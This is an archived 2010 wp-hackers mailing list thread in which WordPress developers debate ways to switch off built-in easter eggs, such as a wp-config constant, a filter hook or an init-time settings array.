	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
Message-ID: <AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>

+1 For a setting in wp-config.

define( 'EASTEREGGS', 'off' );

Then maybe an "eastereggs.php" file we can drop in that defined which ones
we turn off.  That way it's not a wholesale all-off or all-on, but sites
could pick and choose which ones they want to enable (for example, on some
sites I'd definitely want the capital P feature but not the post revision
comparison message ... on others I might want to remove both ... on others I
might want to keep both and remove something else).

On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler <arlenbee at gmail.com> wrote:

> How many easter eggs are there. And I would recommend a setting in
> wp-config.php, rather than a plugin.
>
> On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <austin at ilfilosofo.com
> >wrote:
>
> > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > > As entertaining as the feature might be ... is there any way I can turn
> > it
> > > off on a client site?
> >
> > I proposed a patch here to allow it to be turned off by filter, but
> > the ticket never went anywhere:
> >
> > <
> >
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From peter.westwood at ftwr.co.uk  Fri Oct 22 15:17:13 2010
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Fri, 22 Oct 2010 16:17:13 +0100
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
Message-ID: <329F7455-7B56-4A60-8E90-4C1D43DFE1E7@ftwr.co.uk>


On 22 Oct 2010, at 15:56, Eric Mann wrote:

> +1 For a setting in wp-config.
> 
> define( 'EASTEREGGS', 'off' );
> 
> Then maybe an "eastereggs.php" file we can drop in that defined which ones
> we turn off.  That way it's not a wholesale all-off or all-on, but sites
> could pick and choose which ones they want to enable (for example, on some
> sites I'd definitely want the capital P feature but not the post revision
> comparison message ... on others I might want to remove both ... on others I
> might want to keep both and remove something else).
> 
> 

Extra wp-config.php defines are lame.

Much better to have a filter unless it can't be done that way (not true in this scenario)

Cheers
-- 
Peter Westwood
http://blog.ftwr.co.uk | http://westi.wordpress.com
C53C F8FC 8796 8508 88D6 C950 54F4 5DCD A834 01C5


From arlenbee at gmail.com  Fri Oct 22 15:23:51 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Fri, 22 Oct 2010 11:23:51 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
Message-ID: <AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>

   - off
   - on
   - custom
   - file

How is that? For custom, we would then use an array, or whatever it is that
would be in eastereggs.php, since some people probably want everything in
one file. For file, it would read eastereggs.php.

On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:

> +1 For a setting in wp-config.
>
> define( 'EASTEREGGS', 'off' );
>
> Then maybe an "eastereggs.php" file we can drop in that defined which ones
> we turn off.  That way it's not a wholesale all-off or all-on, but sites
> could pick and choose which ones they want to enable (for example, on some
> sites I'd definitely want the capital P feature but not the post revision
> comparison message ... on others I might want to remove both ... on others
> I
> might want to keep both and remove something else).
>
> On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler <arlenbee at gmail.com> wrote:
>
> > How many easter eggs are there. And I would recommend a setting in
> > wp-config.php, rather than a plugin.
> >
> > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <austin at ilfilosofo.com
> > >wrote:
> >
> > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > > > As entertaining as the feature might be ... is there any way I can
> turn
> > > it
> > > > off on a client site?
> > >
> > > I proposed a patch here to allow it to be turned off by filter, but
> > > the ticket never went anywhere:
> > >
> > > <
> > >
> >
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
> > > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From eric at eam.me  Fri Oct 22 15:28:17 2010
From: eric at eam.me (Eric Mann)
Date: Fri, 22 Oct 2010 08:28:17 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
Message-ID: <AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>

I'd like to see a more fleshed-out example of how that would work, but it
makes logical sense so far :-)

On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com> wrote:

>   - off
>   - on
>   - custom
>   - file
>
> How is that? For custom, we would then use an array, or whatever it is that
> would be in eastereggs.php, since some people probably want everything in
> one file. For file, it would read eastereggs.php.
>
> On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
>
> > +1 For a setting in wp-config.
> >
> > define( 'EASTEREGGS', 'off' );
> >
> > Then maybe an "eastereggs.php" file we can drop in that defined which
> ones
> > we turn off.  That way it's not a wholesale all-off or all-on, but sites
> > could pick and choose which ones they want to enable (for example, on
> some
> > sites I'd definitely want the capital P feature but not the post revision
> > comparison message ... on others I might want to remove both ... on
> others
> > I
> > might want to keep both and remove something else).
> >
> > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
> >
> > > How many easter eggs are there. And I would recommend a setting in
> > > wp-config.php, rather than a plugin.
> > >
> > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <austin at ilfilosofo.com
> > > >wrote:
> > >
> > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > > > > As entertaining as the feature might be ... is there any way I can
> > turn
> > > > it
> > > > > off on a client site?
> > > >
> > > > I proposed a patch here to allow it to be turned off by filter, but
> > > > the ticket never went anywhere:
> > > >
> > > > <
> > > >
> > >
> >
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
> > > > >
> > > > _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From arlenbee at gmail.com  Fri Oct 22 15:36:15 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Fri, 22 Oct 2010 11:36:15 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
	<AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
Message-ID: <AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>

Another way to do it, perhaps a better way, would be to have an easter egg
array that could be set on init.

$eastereggs = array(
'revself' => true,
'wordpress' => true
)

add_action('init','seteastereggs',0);
Function seteastereggs(){
$eastereggs['revself'] = false;
}

On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:

> I'd like to see a more fleshed-out example of how that would work, but it
> makes logical sense so far :-)
>
> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com> wrote:
>
> >   - off
> >   - on
> >   - custom
> >   - file
> >
> > How is that? For custom, we would then use an array, or whatever it is
> that
> > would be in eastereggs.php, since some people probably want everything in
> > one file. For file, it would read eastereggs.php.
> >
> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
> >
> > > +1 For a setting in wp-config.
> > >
> > > define( 'EASTEREGGS', 'off' );
> > >
> > > Then maybe an "eastereggs.php" file we can drop in that defined which
> > ones
> > > we turn off.  That way it's not a wholesale all-off or all-on, but
> sites
> > > could pick and choose which ones they want to enable (for example, on
> > some
> > > sites I'd definitely want the capital P feature but not the post
> revision
> > > comparison message ... on others I might want to remove both ... on
> > others
> > > I
> > > might want to keep both and remove something else).
> > >
> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler <arlenbee at gmail.com>
> > wrote:
> > >
> > > > How many easter eggs are there. And I would recommend a setting in
> > > > wp-config.php, rather than a plugin.
> > > >
> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
> austin at ilfilosofo.com
> > > > >wrote:
> > > >
> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
> > > > > > As entertaining as the feature might be ... is there any way I
> can
> > > turn
> > > > > it
> > > > > > off on a client site?
> > > > >
> > > > > I proposed a patch here to allow it to be turned off by filter, but
> > > > > the ticket never went anywhere:
> > > > >
> > > > > <
> > > > >
> > > >
> > >
> >
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
> > > > > >
> > > > > _______________________________________________
> > > > > wp-hackers mailing list
> > > > > wp-hackers at lists.automattic.com
> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > > >
> > > > _______________________________________________
> > > > wp-hackers mailing list
> > > > wp-hackers at lists.automattic.com
> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > > >
> > > _______________________________________________
> > > wp-hackers mailing list
> > > wp-hackers at lists.automattic.com
> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> > >
> > _______________________________________________
> > wp-hackers mailing list
> > wp-hackers at lists.automattic.com
> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From arlenbee at gmail.com  Fri Oct 22 15:37:25 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Fri, 22 Oct 2010 11:37:25 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
	<AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
	<AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
Message-ID: <AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>

And that could be put in a plugin or wp-config.php according to webmaster
preference.

On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com> wrote:

> Another way to do it, perhaps a better way, would be to have an easter egg
> array that could be set on init.
>
> $eastereggs = array(
> 'revself' => true,
> 'wordpress' => true
> )
>
> add_action('init','seteastereggs',0);
> Function seteastereggs(){
> $eastereggs['revself'] = false;
> }
>
> On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
>
>> I'd like to see a more fleshed-out example of how that would work, but it
>> makes logical sense so far :-)
>>
>> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com> wrote:
>>
>> >   - off
>> >   - on
>> >   - custom
>> >   - file
>> >
>> > How is that? For custom, we would then use an array, or whatever it is
>> that
>> > would be in eastereggs.php, since some people probably want everything
>> in
>> > one file. For file, it would read eastereggs.php.
>> >
>> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
>> >
>> > > +1 For a setting in wp-config.
>> > >
>> > > define( 'EASTEREGGS', 'off' );
>> > >
>> > > Then maybe an "eastereggs.php" file we can drop in that defined which
>> > ones
>> > > we turn off.  That way it's not a wholesale all-off or all-on, but
>> sites
>> > > could pick and choose which ones they want to enable (for example, on
>> > some
>> > > sites I'd definitely want the capital P feature but not the post
>> revision
>> > > comparison message ... on others I might want to remove both ... on
>> > others
>> > > I
>> > > might want to keep both and remove something else).
>> > >
>> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler <arlenbee at gmail.com>
>> > wrote:
>> > >
>> > > > How many easter eggs are there. And I would recommend a setting in
>> > > > wp-config.php, rather than a plugin.
>> > > >
>> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
>> austin at ilfilosofo.com
>> > > > >wrote:
>> > > >
>> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me> wrote:
>> > > > > > As entertaining as the feature might be ... is there any way I
>> can
>> > > turn
>> > > > > it
>> > > > > > off on a client site?
>> > > > >
>> > > > > I proposed a patch here to allow it to be turned off by filter,
>> but
>> > > > > the ticket never went anywhere:
>> > > > >
>> > > > > <
>> > > > >
>> > > >
>> > >
>> >
>> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisions-filter.12816.2.diff
>> > > > > >
>> > > > > _______________________________________________
>> > > > > wp-hackers mailing list
>> > > > > wp-hackers at lists.automattic.com
>> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > > > >
>> > > > _______________________________________________
>> > > > wp-hackers mailing list
>> > > > wp-hackers at lists.automattic.com
>> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > > >
>> > > _______________________________________________
>> > > wp-hackers mailing list
>> > > wp-hackers at lists.automattic.com
>> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > >
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>

From Gavin.Pearce at 3seven9.com  Fri Oct 22 15:40:41 2010
From: Gavin.Pearce at 3seven9.com (Gavin Pearce)
Date: Fri, 22 Oct 2010 16:40:41 +0100
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com><AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com><AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com><AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com><AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com><AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com><AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
	<AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>

Or, another option in the Admin Console (though you risk the chance of
the end-user, switching them on, and wondering why it doesn't do
anything) ...

G

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com
[mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
Beiler
Sent: 22 October 2010 16:37
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] "The Matrix Has You" easter egg

And that could be put in a plugin or wp-config.php according to
webmaster
preference.

On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com>
wrote:

> Another way to do it, perhaps a better way, would be to have an easter
egg
> array that could be set on init.
>
> $eastereggs = array(
> 'revself' => true,
> 'wordpress' => true
> )
>
> add_action('init','seteastereggs',0);
> Function seteastereggs(){
> $eastereggs['revself'] = false;
> }
>
> On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
>
>> I'd like to see a more fleshed-out example of how that would work,
but it
>> makes logical sense so far :-)
>>
>> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com>
wrote:
>>
>> >   - off
>> >   - on
>> >   - custom
>> >   - file
>> >
>> > How is that? For custom, we would then use an array, or whatever it
is
>> that
>> > would be in eastereggs.php, since some people probably want
everything
>> in
>> > one file. For file, it would read eastereggs.php.
>> >
>> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
>> >
>> > > +1 For a setting in wp-config.
>> > >
>> > > define( 'EASTEREGGS', 'off' );
>> > >
>> > > Then maybe an "eastereggs.php" file we can drop in that defined
which
>> > ones
>> > > we turn off.  That way it's not a wholesale all-off or all-on,
but
>> sites
>> > > could pick and choose which ones they want to enable (for
example, on
>> > some
>> > > sites I'd definitely want the capital P feature but not the post
>> revision
>> > > comparison message ... on others I might want to remove both ...
on
>> > others
>> > > I
>> > > might want to keep both and remove something else).
>> > >
>> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler
<arlenbee at gmail.com>
>> > wrote:
>> > >
>> > > > How many easter eggs are there. And I would recommend a setting
in
>> > > > wp-config.php, rather than a plugin.
>> > > >
>> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
>> austin at ilfilosofo.com
>> > > > >wrote:
>> > > >
>> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me>
wrote:
>> > > > > > As entertaining as the feature might be ... is there any
way I
>> can
>> > > turn
>> > > > > it
>> > > > > > off on a client site?
>> > > > >
>> > > > > I proposed a patch here to allow it to be turned off by
filter,
>> but
>> > > > > the ticket never went anywhere:
>> > > > >
>> > > > > <
>> > > > >
>> > > >
>> > >
>> >
>>
http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
ons-filter.12816.2.diff
>> > > > > >
>> > > > > _______________________________________________
>> > > > > wp-hackers mailing list
>> > > > > wp-hackers at lists.automattic.com
>> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > > > >
>> > > > _______________________________________________
>> > > > wp-hackers mailing list
>> > > > wp-hackers at lists.automattic.com
>> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > > >
>> > > _______________________________________________
>> > > wp-hackers mailing list
>> > > wp-hackers at lists.automattic.com
>> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> > >
>> > _______________________________________________
>> > wp-hackers mailing list
>> > wp-hackers at lists.automattic.com
>> > http://lists.automattic.com/mailman/listinfo/wp-hackers
>> >
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>>
>
>
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

From eric at eam.me  Fri Oct 22 15:43:34 2010
From: eric at eam.me (Eric Mann)
Date: Fri, 22 Oct 2010 08:43:34 -0700
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
	<AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
	<AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
	<AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>
Message-ID: <AANLkTim71gzvunufV4OdP_K=ssv6MVFNKQXbzsOGZWCq@mail.gmail.com>

The admin console has enough options already ... besides, adding a visible
option would defeat the point of having an Easter egg in the first place and
add needless clutter with an option that "doesn't do anything" the user is
aware of.

On Fri, Oct 22, 2010 at 8:40 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> Or, another option in the Admin Console (though you risk the chance of
> the end-user, switching them on, and wondering why it doesn't do
> anything) ...
>
> G
>
> -----Original Message-----
> From: wp-hackers-bounces at lists.automattic.com
> [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Arlen
> Beiler
> Sent: 22 October 2010 16:37
> To: wp-hackers at lists.automattic.com
> Subject: Re: [wp-hackers] "The Matrix Has You" easter egg
>
> And that could be put in a plugin or wp-config.php according to
> webmaster
> preference.
>
> On Fri, Oct 22, 2010 at 11:36 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
>
> > Another way to do it, perhaps a better way, would be to have an easter
> egg
> > array that could be set on init.
> >
> > $eastereggs = array(
> > 'revself' => true,
> > 'wordpress' => true
> > )
> >
> > add_action('init','seteastereggs',0);
> > Function seteastereggs(){
> > $eastereggs['revself'] = false;
> > }
> >
> > On Fri, Oct 22, 2010 at 11:28 AM, Eric Mann <eric at eam.me> wrote:
> >
> >> I'd like to see a more fleshed-out example of how that would work,
> but it
> >> makes logical sense so far :-)
> >>
> >> On Fri, Oct 22, 2010 at 8:23 AM, Arlen Beiler <arlenbee at gmail.com>
> wrote:
> >>
> >> >   - off
> >> >   - on
> >> >   - custom
> >> >   - file
> >> >
> >> > How is that? For custom, we would then use an array, or whatever it
> is
> >> that
> >> > would be in eastereggs.php, since some people probably want
> everything
> >> in
> >> > one file. For file, it would read eastereggs.php.
> >> >
> >> > On Fri, Oct 22, 2010 at 10:56 AM, Eric Mann <eric at eam.me> wrote:
> >> >
> >> > > +1 For a setting in wp-config.
> >> > >
> >> > > define( 'EASTEREGGS', 'off' );
> >> > >
> >> > > Then maybe an "eastereggs.php" file we can drop in that defined
> which
> >> > ones
> >> > > we turn off.  That way it's not a wholesale all-off or all-on,
> but
> >> sites
> >> > > could pick and choose which ones they want to enable (for
> example, on
> >> > some
> >> > > sites I'd definitely want the capital P feature but not the post
> >> revision
> >> > > comparison message ... on others I might want to remove both ...
> on
> >> > others
> >> > > I
> >> > > might want to keep both and remove something else).
> >> > >
> >> > > On Fri, Oct 22, 2010 at 7:42 AM, Arlen Beiler
> <arlenbee at gmail.com>
> >> > wrote:
> >> > >
> >> > > > How many easter eggs are there. And I would recommend a setting
> in
> >> > > > wp-config.php, rather than a plugin.
> >> > > >
> >> > > > On Fri, Oct 22, 2010 at 10:37 AM, Austin Matzko <
> >> austin at ilfilosofo.com
> >> > > > >wrote:
> >> > > >
> >> > > > > On Fri, Oct 22, 2010 at 9:29 AM, Eric Mann <eric at eam.me>
> wrote:
> >> > > > > > As entertaining as the feature might be ... is there any
> way I
> >> can
> >> > > turn
> >> > > > > it
> >> > > > > > off on a client site?
> >> > > > >
> >> > > > > I proposed a patch here to allow it to be turned off by
> filter,
> >> but
> >> > > > > the ticket never went anywhere:
> >> > > > >
> >> > > > > <
> >> > > > >
> >> > > >
> >> > >
> >> >
> >>
> http://core.trac.wordpress.org/attachment/ticket/12816/easter-egg-revisi
> ons-filter.12816.2.diff
> >> > > > > >
> >> > > > > _______________________________________________
> >> > > > > wp-hackers mailing list
> >> > > > > wp-hackers at lists.automattic.com
> >> > > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > > > >
> >> > > > _______________________________________________
> >> > > > wp-hackers mailing list
> >> > > > wp-hackers at lists.automattic.com
> >> > > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > > >
> >> > > _______________________________________________
> >> > > wp-hackers mailing list
> >> > > wp-hackers at lists.automattic.com
> >> > > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> > >
> >> > _______________________________________________
> >> > wp-hackers mailing list
> >> > wp-hackers at lists.automattic.com
> >> > http://lists.automattic.com/mailman/listinfo/wp-hackers
> >> >
> >> _______________________________________________
> >> wp-hackers mailing list
> >> wp-hackers at lists.automattic.com
> >> http://lists.automattic.com/mailman/listinfo/wp-hackers
> >>
> >
> >
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From arlenbee at gmail.com  Fri Oct 22 15:43:48 2010
From: arlenbee at gmail.com (Arlen Beiler)
Date: Fri, 22 Oct 2010 11:43:48 -0400
Subject: [wp-hackers] "The Matrix Has You" easter egg
In-Reply-To: <CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>
References: <AANLkTin3V3+E6Y6wbAXVn5GJB4oMkDxr066ivW3kUAS4@mail.gmail.com>
	<AANLkTikrfG-eP-ojxdSLOpQ1360HsNe3tGjyXh53MDLe@mail.gmail.com>
	<AANLkTin6bRr0004PSrGOrqzXNk9AgG2XzsR05ttzKbQy@mail.gmail.com>
	<AANLkTi=CnuisniiEdTwqhCYcYBPN6sUSncDFmyTa80v7@mail.gmail.com>
	<AANLkTimVTQqq2sRXoY967g8RJAQPtfO7qOVQakMeqhAz@mail.gmail.com>
	<AANLkTikHg5X_zr5ppVwa=JzXM8hRE7+6dF5UsCPCkkmj@mail.gmail.com>
	<AANLkTinDE2tn83edT8yBrqj3OVoU9vDpuEC0p8t8v0w1@mail.gmail.com>
	<AANLkTinaYq8==Q1H+p14MD4NGigUpNQ4kT6_76tq7-pF@mail.gmail.com>
	<CD47955B7E065D48AB5CF226C2ED75C02E3794@tbs-sbs01.TBS.local>
Message-ID: <AANLkTi=StNcfhAus-PdQmozkHrC3Y79ZJWFWPnar1Gwx@mail.gmail.com>

In my opinion, something like this should not be in the admin panel. Like
you said, it would create too much confusion and needless fumbling.
WordPress is supposed to be simple, not complicated.

On Fri, Oct 22, 2010 at 11:40 AM, Gavin Pearce <Gavin.Pearce at 3seven9.com>wrote:

> Or, another option in the Admin Console (though you risk the chance of
> the end-user, switching them on, and wondering why it doesn't do
> anything) ...
>
> G
>
> -----Original Message-----
